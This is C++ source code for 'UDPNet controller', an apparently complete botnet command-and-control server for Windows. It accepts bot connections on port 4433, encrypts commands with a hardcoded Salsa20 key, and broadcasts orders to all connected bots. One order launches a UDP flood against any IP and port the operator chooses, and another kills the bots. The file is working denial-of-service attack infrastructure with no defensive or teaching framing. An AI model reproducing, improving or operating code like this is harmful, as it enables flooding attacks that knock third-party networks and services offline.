#include <WinSock2.h>
#include <Windows.h>
#include <fcntl.h>
#include <io.h>

#include <algorithm>
#include <iostream>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include "salsa20.h"

enum CommandType {
  kUDP = 0,
  kExit,
  kNothing = 999999,
};

struct Command {
  DWORD command_type;
  CHAR param_string1[64];
  CHAR param_string2[64];
  CHAR param_string3[64];
  CHAR param_string4[64];
  DWORD param_dword1;
  DWORD param_dword2;
  DWORD param_dword3;
  DWORD param_dword4;
};

typedef Command* LPCOMMAND;

struct Client {
  SOCKET socket;
  Command command;
};

void BotListener();
DWORD WINAPI BotThread(LPVOID lpVoid);
int IsConnected(SOCKET* socket);
std::vector<std::string> Split(std::string str, char delimiter);
void Title();

std::vector<Client*> clients;
int bot_count = 0;

int main() {
  std::thread listner(BotListener);
  std::thread title(Title);
  HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
  SetConsoleTextAttribute(hConsole, 11);
  HWND console = GetConsoleWindow();
  RECT ConsoleRect;
  GetWindowRect(console, &ConsoleRect);
  MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 450, 600, TRUE);

  CONSOLE_SCREEN_BUFFER_INFO info;
  GetConsoleScreenBufferInfo(hConsole, &info);
  COORD new_size = {info.srWindow.Right - info.srWindow.Left + 1,
                    info.srWindow.Bottom - info.srWindow.Top + 1};
  SetConsoleScreenBufferSize(hConsole, new_size);

  _setmode(_fileno(stdout), _O_U16TEXT);
  std::wcout << std::endl;
  std::wcout << L"  ╔════════════════════════════════════════════════╗";
  std::wcout << L"  ║ Welcom Yellow!                                 ║";
  std::wcout << L"  ║ This is UDPNet controller.                     ║";
  std::wcout << L"  ║ Type HELP to show help menu.                   ║";
  std::wcout << L"  ╠════════════════════════════════════════════════╣";
  std::wcout << L"  ║ HELP                                           ║";
  std::wcout << L"  ║ UDP <IP> <PORT> <INTERVAL> <DURATION> <THREAD> ║";
  std::wcout << L"  ║ KILLBOTS <EXITCODE>                            ║";
  std::wcout << L"  ╚════════════════════════════════════════════════╝";
  std::wcout << std::endl;

  while (true) {
    std::wcout << L"UDPNet> ";
    std::string input;
    std::getline(std::cin, input);
    std::vector<std::string> splited = Split(input, ' ');
    if (splited.size() > 0) {
      if (!strcmp(splited[0].c_str(), "HELP")) {
        std::wcout << std::endl;
        std::wcout << L"  ╔════════════════════════════════════════════════╗";
        std::wcout << L"  ║ Welcom Yellow!                                 ║";
        std::wcout << L"  ║ This is UDPNet controller.                     ║";
        std::wcout << L"  ║ Type HELP to show help menu.                   ║";
        std::wcout << L"  ╠════════════════════════════════════════════════╣";
        std::wcout << L"  ║ HELP                                           ║";
        std::wcout << L"  ║ UDP <IP> <PORT> <INTERVAL> <DURATION> <THREAD> ║";
        std::wcout << L"  ║ KILLBOTS <EXITCODE>                            ║";
        std::wcout << L"  ╚════════════════════════════════════════════════╝";
        std::wcout << std::endl;
      } else if (!strcmp(splited[0].c_str(), "UDP")) {
        if (splited.size() != 6) {
          std::wcout << L"UDP <IP> <PORT> <INTERVAL> <DURATION> <THREAD>";
          std::wcout << std::endl;
        } else {
          LPCOMMAND command = (LPCOMMAND)malloc(sizeof(Command));
          command->command_type = kUDP;
          strcpy(command->param_string1, splited[1].c_str());
          command->param_dword1 = atoi(splited[2].c_str());
          command->param_dword2 = atoi(splited[3].c_str());
          command->param_dword3 = atoi(splited[4].c_str());
          command->param_dword4 = atoi(splited[5].c_str());
          for (int i = 0; i < clients.size(); i++) {
            if (IsConnected(&(clients[i]->socket))) {
              clients[i]->command = *command;
            }
          }
        }
      } else if (!strcmp(splited[0].c_str(), "KILLBOTS")) {
        if (splited.size() != 2) {
          std::wcout << L"KILLBOTS <EXITCODE>";
          std::wcout << std::endl;
        } else {
          LPCOMMAND command = (LPCOMMAND)malloc(sizeof(Command));
          command->command_type = kExit;
          command->param_dword1 = atoi(splited[1].c_str());
          for (int i = 0; i < clients.size(); i++) {
            if (IsConnected(&(clients[i]->socket))) {
              clients[i]->command = *command;
            } else {
              clients.erase(clients.begin() + i);
            }
          }
        }
      } else {
        std::wcout << L"Unknown command";
        std::wcout << std::endl;
      }
    }
  }
}

void BotListener() {
  WSADATA wsaData;
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  SOCKET hListen;
  hListen = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  SOCKADDR_IN tListenAddr = {};
  tListenAddr.sin_family = AF_INET;
  tListenAddr.sin_port = htons(4433);
  tListenAddr.sin_addr.s_addr = INADDR_ANY;

  bind(hListen, (SOCKADDR*)&tListenAddr, sizeof(tListenAddr));
  listen(hListen, SOMAXCONN);

  SOCKADDR_IN tClientAddr = {};
  int tClientSize = sizeof(tClientAddr);
  while (TRUE) {
    SOCKET hClient = INVALID_SOCKET;
    hClient = accept(hListen, (SOCKADDR*)&tClientAddr, &tClientSize);
    if (hClient == INVALID_SOCKET) {
      continue;
    } else {
      Command command;
      command.command_type = kNothing;
      Client* newClient = new Client;
      newClient->socket = hClient;
      newClient->command = command;
      clients.push_back(newClient);

      CreateThread(NULL, NULL, BotThread, (LPVOID)newClient, NULL, NULL);
    }
  }
}

DWORD WINAPI BotThread(LPVOID lpVoid) {
  uint8_t key[32] = {43, 92,  182, 48, 39,  5,  84, 17, 38,  58, 82,
                     37, 183, 2,   9,  85,  74, 53, 92, 106, 94, 28,
                     1,  94,  58,  92, 215, 43, 11, 94, 10,  9};
  Salsa20 crypter(key);
  bot_count++;
  while (TRUE) {
    if (IsConnected(&((Client*)lpVoid)->socket)) {
      if (((Client*)lpVoid)->command.command_type != kNothing) {
        crypter.Salsa20Do((uint8_t*)&(((Client*)lpVoid)->command),
                          sizeof(Command), 372);
        int sentSize =
            send(((Client*)lpVoid)->socket,
                 (char*)&(((Client*)lpVoid)->command), sizeof(Command), 0);
        if (sentSize != sizeof(Command)) {
          break;
        }
        ((Client*)lpVoid)->command.command_type = kNothing;
      }
    } else {
      break;
    }
    Sleep(1000);
  }
  bot_count--;
  return 0;
}

int IsConnected(SOCKET* socket) {
  int socket_status = send(*socket, "\x00\x01\x00\x01", 4, 0);
  if (socket_status == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) {
    return 0;
  }
  return 1;
}

std::vector<std::string> Split(std::string str, char delimiter) {
  std::vector<std::string> internal;
  std::stringstream ss(str);
  std::string temp;

  while (std::getline(ss, temp, delimiter)) {
    internal.push_back(temp);
  }

  return internal;
}

void Title() {
  while (TRUE) {
    LPSTR title = (LPSTR)malloc(128 * sizeof(CHAR));
    sprintf(title, "UDPNet - [%d] Bots", bot_count);
    SetConsoleTitleA(title);
    free(title);
    Sleep(1000);
  }
}